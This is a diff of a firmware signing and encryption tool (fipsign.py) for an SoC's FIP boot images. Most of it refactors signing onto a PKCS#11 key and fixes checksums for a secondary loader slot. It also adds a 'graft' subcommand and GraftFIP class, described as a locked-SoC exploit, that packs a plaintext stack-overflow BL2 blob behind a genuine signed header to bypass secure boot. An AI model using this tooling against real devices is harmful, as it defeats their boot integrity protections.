@@ -1,0 +1,368 @@
+--- a/fipsign.py
++++ b/fipsign.py
+@@ -3,19 +3,17 @@
+ 
+ import logging
+ import argparse
++import hashlib
++import subprocess
++import tempfile
+ from struct import unpack
+ 
+-from Crypto.Cipher import AES
+-from Crypto.Hash import SHA256
+-from Crypto.PublicKey import RSA
+-from Crypto.Signature import pkcs1_15
+-
+ try:
+     import argcomplete
+ except ImportError:
+     argcomplete = None
+ 
+-from fiptool import FIP, IMAGE_ALIGN, init_logging
++from fiptool import FIP, IMAGE_ALIGN, LOADER_2ND_MAGIC_LIST, init_logging
+ 
+ ENCRYPTION_KEY_SIZE = 16
+ ENCRYPTION_BLOCK_SIZE = 16
+@@ -23,46 +21,107 @@
+ 
+ 
+ class SignedFIP(FIP):
+-    def __init__(self, root_priv_path, bl_priv_path):
++    def __init__(self, bl_uri, root_pk_path, bl_pk_path, bl_pk_sig_path):
+         super().__init__()
+ 
+-        with open(root_priv_path, "rb") as fp:
+-            din = fp.read()
+-            self.root_priv = RSA.import_key(din)
+-
+-        with open(bl_priv_path, "rb") as fp:
+-            din = fp.read()
+-            self.bl_priv = RSA.import_key(din)
++        # bl key (sg1-sb) as an RFC 7512 pkcs11: URI. Signing is delegated to the
++        # OpenSSL CLI, which resolves the URI through pkcs11-provider; with the
++        # autopen module that routes token -> daemon (the key never leaves the
++        # TPM, no PIN in the build). A software URI/key would work identically.
++        self.bl_uri = bl_uri
++
++        # Committed public material: root_pk/bl_pk are the 256-byte big-endian RSA
++        # moduli (from the certs); bl_pk_sig is the one-time COLD sg1-root
++        # signature over bl_pk. Root never signs here.
++        with open(root_pk_path, "rb") as fp:
++            self.root_pk = fp.read()
++        with open(bl_pk_path, "rb") as fp:
++            self.bl_pk = fp.read()
++        with open(bl_pk_sig_path, "rb") as fp:
++            self.bl_pk_sig = fp.read()
++        assert len(self.root_pk) == 256, len(self.root_pk)
++        assert len(self.bl_pk) == 256, len(self.bl_pk)
++        assert len(self.bl_pk_sig) == 256, len(self.bl_pk_sig)
+ 
+     def read_fip(self, path):
+         super().read_fip(path)
+ 
+-        # Verity the reading of fip.bin
++        # Polyglot fip: the base read_fip2 does not read the secondary
++        # core's LOADER_2ND_B slot, so it lands in rest_fip and make() drops it,
++        # breaking the round-trip below. Read it here so the model is complete.
++        self.read_loader_2nd_b(path)
++
++        # Verify the reading of fip.bin
+         with open(path, "rb") as fp:
+             assert fp.read() == self.make()
+ 
+-    def rsa_to_n(self, rsa):
+-        return rsa.n.to_bytes(rsa.size_in_bytes(), byteorder="big")
++    def read_loader_2nd_b(self, path):
++        # Mirror read_loader_2nd for the secondary slot: its size lives in the
++        # embedded loader_2nd header (symmetric packing), and param2 gives the
++        # offset. Reading exactly [loadaddr : loadaddr+size] lets base
++        # pack_loader_2nd_b re-emit it byte-identically (verified).
++        loadaddr = self.param2["LOADER_2ND_B_LOADADDR"].toint()
++        if not loadaddr:
++            return
++        with open(path, "rb") as fp:
++            fip_bin = fp.read()
++        self._parse_ldr_2nd_hdr(fip_bin[loadaddr:])
++        if self.ldr_2nd_hdr["MAGIC"].content not in LOADER_2ND_MAGIC_LIST:
++            raise ValueError("loader_2nd_b magic %r" % self.ldr_2nd_hdr["MAGIC"].content)
++        size = self.ldr_2nd_hdr["SIZE"].toint()
++        self.body2["LOADER_2ND_B"].content = fip_bin[loadaddr : loadaddr + size]
++        self.read_end = loadaddr + size
++        self.rest_fip = fip_bin[self.read_end :]
++        # Restore ldr_2nd_hdr to the PRIMARY slot: the LOADER_2ND sign/encrypt
++        # path relies on the read-time header state (it does not re-parse).
++        primary = self.param2["LOADER_2ND_LOADADDR"].toint()
++        if primary:
++            self._parse_ldr_2nd_hdr(fip_bin[primary:])
++
++    def _update_ldr_2nd_hdr(self, slot="LOADER_2ND"):
++        # Slot-parameterized copy of FIP._update_ldr_2nd_hdr so we can refresh the
++        # secondary loader header (SIZE + CKSUM) after appending its signature.
++        # Uses self.ldr_2nd_hdr, so parse that slot's header before calling.
++        image = self.body2[slot].content
++        hdr_size = self._param_size(self.ldr_2nd_hdr)
++        hdr, body = image[:hdr_size], image[hdr_size:]
++
++        self.ldr_2nd_hdr["SIZE"].content = len(image)
++
++        hdr = bytearray(b"".join((e.content for e in self.ldr_2nd_hdr.values())))
++        hdr_cksum = self.ldr_2nd_hdr["CKSUM"]
++        crc = self.image_crc((hdr + body)[hdr_cksum.end :])
++        hdr_cksum.content = crc
++        hdr = bytearray(b"".join((e.content for e in self.ldr_2nd_hdr.values())))
++
++        self.body2[slot].content = hdr + body
+ 
+     def print_kpub_hash(self, bytes):
+         bytes_str = ['{:02x}'.format(int(i)) for i in bytes]
+         logging.info("KPUB_HASH:" + "".join(bytes_str))
+ 
+     def sign_bl_pk(self):
+-        self.param1["ROOT_PK"].content = self.rsa_to_n(self.root_priv)
+-        kpub_hash = SHA256.new(self.param1["ROOT_PK"].content[:256])
++        self.param1["ROOT_PK"].content = self.root_pk
++        kpub_hash = hashlib.sha256(self.param1["ROOT_PK"].content[:256])
+         self.print_kpub_hash(kpub_hash.digest())
+ 
+-        self.param1["BL_PK"].content = self.rsa_to_n(self.bl_priv)
+-
+-        digest = SHA256.new(self.rsa_to_n(self.bl_priv))
++        self.param1["BL_PK"].content = self.bl_pk
+ 
+-        sig = pkcs1_15.new(self.root_priv).sign(digest)
+-        self.param1["BL_PK_SIG"].content = sig
++        # BL_PK_SIG is the cold sg1-root signature over bl_pk, committed upfront.
++        self.param1["BL_PK_SIG"].content = self.bl_pk_sig
+ 
+     def sign_by_bl_priv(self, image):
+-        digest = SHA256.new(image)
+-        return pkcs1_15.new(self.bl_priv).sign(digest)
++        # SHA-256 + PKCS#1 v1.5 via the OpenSSL CLI over the pkcs11 URI. openssl's
++        # digest+sign matches pkcs1_15(SHA256(image)), so the FIP sigs are exact.
++        with tempfile.NamedTemporaryFile() as msg, tempfile.NamedTemporaryFile() as sig:
++            msg.write(bytes(image))
++            msg.flush()
++            subprocess.run(
++                ["openssl", "dgst", "-sha256", "-sign", self.bl_uri,
++                 "-out", sig.name, msg.name],
++                check=True,
++            )
++            return open(sig.name, "rb").read()
+ 
+     def sign(self):
+         logging.info("sign fip.bin")
+@@ -88,7 +147,7 @@
+     def sign_fip2(self):
+         logging.debug("sign_fip2:")
+ 
+-        sig_size = len(self.rsa_to_n(self.bl_priv))
++        sig_size = len(self.bl_pk)
+ 
+         for name in ["BLCP_2ND", "MONITOR"]:
+             e = self.body2[name]
+@@ -122,25 +181,58 @@
+ 
+             e.content = image
+ 
++        # Polyglot fip: sign the secondary core's LOADER_2ND_B the same way
++        # (parse its header, append sig, refresh SIZE+CKSUM, sign after CKSUM), so
++        # the secondary FSBL verifies it under secure boot exactly like LOADER_2ND.
++        loader_2nd_b_loadaddr = self.param2["LOADER_2ND_B_LOADADDR"].toint()
++        if loader_2nd_b_loadaddr:
++            logging.info("sign %s at %#x", "LOADER_2ND_B", loader_2nd_b_loadaddr)
+ 
+-class EncryptedFIP(SignedFIP):
+-    def __init__(self, root_priv_path, bl_priv_path, ldr_ek_path, bl_ek_path):
+-        super().__init__(root_priv_path, bl_priv_path)
++            e = self.body2["LOADER_2ND_B"]
++            self._parse_ldr_2nd_hdr(e.content)
++            e.content = self.pad(e.content + b"\xCE" * sig_size, IMAGE_ALIGN)
++            self._update_ldr_2nd_hdr("LOADER_2ND_B")
+ 
++            image = bytearray(e.content)
++            sig = self.sign_by_bl_priv(image[self.ldr_2nd_hdr["CKSUM"].end : -sig_size])
++            assert sig_size == len(sig)
++            image[-sig_size:] = sig
++
++            e.content = image
++            # Recompute the loader header CKSUM over the FINAL content (with the
++            # real sig). For LOADER_2ND, pack_loader_2nd does this at make() time;
++            # base pack_loader_2nd_b appends verbatim, so the B slot would keep the
++            # cksum computed over the 0xCE placeholder and the secondary FSBL would
++            # reject it at SCS=0. ldr_2nd_hdr is still parsed for this slot here.
++            self._update_ldr_2nd_hdr("LOADER_2ND_B")
++
++
++class EncryptedFIP(SignedFIP):
++    # bl_ek encrypts the images; ldr_ek (the fused device KEK) wraps bl_ek into
++    # the BL_EK field. Both are 16-byte AES-128 keys derived deterministically
++    # from sg1-enc + serial (SG1-FWENC-v1 / SG1-LDRKEK-v1); see deriveFwKey.nix.
++    # AES-128-CBC, zero IV, matching the ROM (security.c cryptodma_aes_decrypt).
++    def __init__(self, bl_uri, root_pk_path, bl_pk_path, bl_pk_sig_path, ldr_ek_path, bl_ek_path):
++        super().__init__(bl_uri, root_pk_path, bl_pk_path, bl_pk_sig_path)
+         with open(ldr_ek_path, "rb") as fp:
+             self.ldr_ek = fp.read()
+-
+         with open(bl_ek_path, "rb") as fp:
+             self.bl_ek = fp.read()
++        assert len(self.ldr_ek) == ENCRYPTION_KEY_SIZE, len(self.ldr_ek)
++        assert len(self.bl_ek) == ENCRYPTION_KEY_SIZE, len(self.bl_ek)
+ 
+     def _aes_encrypt(self, key, plain):
+-        return AES.new(key, iv=IV_ZERO, mode=AES.MODE_CBC).encrypt(plain)
++        # Lazy import so the sign-only path needs no crypto library.
++        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
++        enc = Cipher(algorithms.AES(bytes(key)), modes.CBC(IV_ZERO)).encryptor()
++        return enc.update(bytes(plain)) + enc.finalize()
+ 
+     def encrypt(self):
+         logging.debug("encrypt:")
+ 
+         self.param1["FIP_FLAGS"].content = self.FIP_FLAGS_ENCRYPTED_MASK | self.param1["FIP_FLAGS"].toint()
+ 
++        # bl_ek wrapped by ldr_ek; the device unwraps it with the fused loader key.
+         self.param1["BL_EK"].content = self._aes_encrypt(self.ldr_ek, self.bl_ek)
+         self.body1["BL2"].content = self._aes_encrypt(self.bl_ek, self.body1["BL2"].content)
+ 
+@@ -148,28 +240,96 @@
+             e = self.body2[name]
+             if not e.content:
+                 continue
+-
+             logging.info("encrypt %s: len=%#x", name, len(e.content))
+             e.content = self._aes_encrypt(self.bl_ek, e.content)
+ 
+         loader_2nd_loadaddr = self.param2["LOADER_2ND_LOADADDR"].toint()
+         if loader_2nd_loadaddr:
+             logging.info("encrypt %s at %#x", "LOADER_2ND_LOADADDR", loader_2nd_loadaddr)
+-
+-            # Only data after header are encrypted
++            # Only the body after the header is encrypted.
+             e = self.body2["LOADER_2ND"]
++            hdr_size = self._param_size(self.ldr_2nd_hdr)
++            hdr, body = e.content[:hdr_size], e.content[hdr_size:]
++            e.content = hdr + self._aes_encrypt(self.bl_ek, body)
+ 
++        # Polyglot fip: encrypt the secondary LOADER_2ND_B body the same way
++        # (header stays plaintext; only the body after it is encrypted).
++        loader_2nd_b_loadaddr = self.param2["LOADER_2ND_B_LOADADDR"].toint()
++        if loader_2nd_b_loadaddr:
++            logging.info("encrypt %s at %#x", "LOADER_2ND_B", loader_2nd_b_loadaddr)
++            e = self.body2["LOADER_2ND_B"]
++            self._parse_ldr_2nd_hdr(e.content)
+             hdr_size = self._param_size(self.ldr_2nd_hdr)
+             hdr, body = e.content[:hdr_size], e.content[hdr_size:]
++            e.content = hdr + self._aes_encrypt(self.bl_ek, body)
++
++            # Refresh the B header CKSUM over the ENCRYPTED content. The FSBL checks
++            # it BEFORE decrypting -- bl2_opt.c does load -> p_rom_api_image_crc ->
++            # dec_verify_image -- so the cksum must cover the ciphertext.
++            #
++            # LOADER_2ND needs no such call because make() -> pack_loader_2nd
++            # recomputes its header after encrypt(). The B slot does not get that:
++            # fip-sign.nix builds against the UNPATCHED vendor fiptool, whose
++            # pack_loader_2nd_b just appends the content verbatim (only
++            # fip-polyglot.nix applies fiptool-loader-2nd-b-symmetric.patch). So the
++            # B header keeps whatever cksum was last written -- here, the one
++            # sign_fip2 computed over the PLAINTEXT -- and the C906 FSBL rejects it.
++            #
++            # This is the same bug 1bbb5ec fixed one stage earlier (B header kept the
++            # cksum over the 0xCE signature placeholder). Signed-only images were
++            # correct because sign_fip2's refresh is the last mutation; adding
++            # encryption after it reopened the hole. Measured on the bench fips:
++            # LOADER_2ND (arm) OK in all of them, LOADER_2ND_B (riscv) OK when
++            # signed-only and MISMATCH in every signed-enc one, with the recorded
++            # value equal to the signed-only image's cksum.
++            #
++            # Encryption is length-preserving here (sign_fip2 already padded to
++            # IMAGE_ALIGN and AES-CBC adds nothing), so pack_loader_2nd_b's own
++            # pad() is a no-op and its LOADER_2ND_B_SIZE still matches hdr SIZE.
++            self._update_ldr_2nd_hdr("LOADER_2ND_B")
++
++
++class GraftFIP(FIP):
++    # Keyless FIP reader that also models the polyglot's secondary LOADER_2ND_B
++    # slot, so a genuine signed(+encrypted) polyglot round-trips and can be
++    # re-packed after swapping just the BL2 slot. This builds the locked SoC
++    # exploit: reuse a real signed header (ROOT_PK/BL_PK/BL_PK_SIG/CHIP_CONF+SIG/
++    # BL_EK/FIP_FLAGS) and the real encrypted second-stage images VERBATIM, and
++    # replace only BL2 with the PLAINTEXT overflow blob. The ROM's VRK/VBK/DK/VCC
++    # pass on the genuine header, then load_image copies the plaintext BL2 raw and
++    # overruns the stack before DB2/VB2 -- so the overwrite is controlled even at
++    # SCS=02 (the BL2 must stay plaintext; a re-encrypt would ruin the overflow).
++    read_loader_2nd_b = SignedFIP.read_loader_2nd_b
++
++    def read_fip(self, path):
++        super().read_fip(path)
++        self.read_loader_2nd_b(path)
++        with open(path, "rb") as fp:
++            assert fp.read() == self.make()
+ 
+-            body = self._aes_encrypt(self.bl_ek, body)
+-            e.content = hdr + body
++
++def graft_fip(args):
++    logging.debug("graft_fip:")
++
++    fip = GraftFIP()
++    fip.read_fip(args.SRC_FIP)
++
++    with open(args.BL2, "rb") as fp:
++        fip.body1["BL2"].content = fp.read()
++
++    # make() recomputes BL2_IMG_SIZE + BL2_IMG_CKSUM, re-lays every offset, and
++    # refreshes PARAM_CKSUM/PARAM2_CKSUM. The stale BL2_IMG_SIG is left as-is; VB2
++    # never runs because the overflow hijacks control at the load_image copy.
++    fip_bin = fip.make()
++    fip.print_fip_params()
++    with open(args.DEST_FIP, "wb") as fp:
++        fp.write(fip_bin)
+ 
+ 
+ def sign_fip(args):
+     logging.debug("sign_fip:")
+ 
+-    fip = SignedFIP(args.root_priv, args.bl_priv)
++    fip = SignedFIP(args.bl_uri, args.root_pk, args.bl_pk, args.bl_pk_sig)
+     fip.read_fip(args.SRC_FIP)
+ 
+     fip.sign()
+@@ -183,9 +343,12 @@
+ def encrypt_fip(args):
+     logging.debug("encrypt_fip:")
+ 
+-    fip = EncryptedFIP(args.root_priv, args.bl_priv, args.ldr_ek, args.bl_ek)
++    fip = EncryptedFIP(
++        args.bl_uri, args.root_pk, args.bl_pk, args.bl_pk_sig, args.ldr_ek, args.bl_ek
++    )
+     fip.read_fip(args.SRC_FIP)
+ 
++    # Sign the plaintext images, then encrypt (the device decrypts, then verifies).
+     fip.sign()
+     fip.encrypt()
+ 
+@@ -220,9 +383,21 @@
+     pr_sign = subparsers.add_parser("sign")
+     pr_sign.set_defaults(func=sign_fip)
+ 
++    # graft: keyless BL2 swap onto a genuine signed(/enc) FIP -> locked-SoC exploit.
++    pr_graft = subparsers.add_parser("graft")
++    pr_graft.set_defaults(func=graft_fip)
++    pr_graft.add_argument("SRC_FIP", type=str, help="genuine signed(+enc) fip.bin")
++    pr_graft.add_argument("BL2", type=str, help="plaintext overflow BL2 blob")
++    pr_graft.add_argument("DEST_FIP", type=str, help="grafted exploit fip.bin")
++
+     for pr in [pr_sign, pr_encrypt]:
+-        pr.add_argument("--root-priv", type=str)
+-        pr.add_argument("--bl-priv", type=str)
++        # --bl-uri is sg1-sb's pkcs11: URI (openssl signs through the
++        # provider); --root-pk / --bl-pk are the committed 256-byte moduli;
++        # --bl-pk-sig is the committed sg1-root signature over bl_pk.
++        pr.add_argument("--bl-uri", type=str, help="sg1-sb pkcs11: URI")
++        pr.add_argument("--root-pk", type=str, help="root RSA modulus, 256 bytes big-endian")
++        pr.add_argument("--bl-pk", type=str, help="bl RSA modulus, 256 bytes big-endian")
++        pr.add_argument("--bl-pk-sig", type=str, help="cold sg1-root sig over bl_pk")
+         pr.add_argument("SRC_FIP", type=str, help="Source fip.bin")
+         pr.add_argument("DEST_FIP", type=str, help="Signed fip.bin")
+ 
